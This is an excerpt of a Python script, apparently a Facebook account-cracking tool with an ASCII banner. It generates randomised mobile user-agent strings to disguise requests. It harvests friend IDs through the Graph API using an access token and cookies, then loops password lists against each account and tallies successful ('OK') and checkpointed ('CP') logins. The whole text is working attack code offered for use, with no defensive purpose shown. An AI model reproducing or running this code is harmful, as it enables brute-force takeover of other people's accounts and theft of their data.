...
for xd in range(10000):
	...
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4.0','5.0','6.0','7.0','8.0','4.1.1','5.1.1','6.0.1','71.1','7.1.2','8.1.0','8.1.1','9','10','11','12'])
	c='220233L2G Build/RP1A.200720.011; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
...
for xd in range(10000):
	...
	c='RMX1811 Build/OPM1.171019.026; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/344.0.0.10.83;]'
	uaku=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen2.append(uaku)
...
def banner():
	...
	sol().print(cik2)
	ban='''
_____ ______  ___  _____  _   _______ _   ___   _______ _   _ 
/  __ \| ___ \/ _ \/  __ \| | / /_   _| \ | \ \ / /  _  | | | |
| /  \/| |_/ / /_\ \ /  \/| |/ /  | | |  \| |\ V /| | | | | | |
| |    |    /|  _  | |    |    \  | | | . ` | \ / | | | | | | |
| \__/\| |\ \| | | | \__/\| |\  \_| |_| |\  | | | \ \_/ / |_| |
 \____/\_| \_\_| |_/\____/\_| \_/\___/\_| \_/ \_/  \___/ \___/ 
...
def dumpPublik():
	...
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%s MURDOCK-XD %s/%s  OK:%s  CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
...
def crackfree(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s XyinCode %s/%s  OK:%s  CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
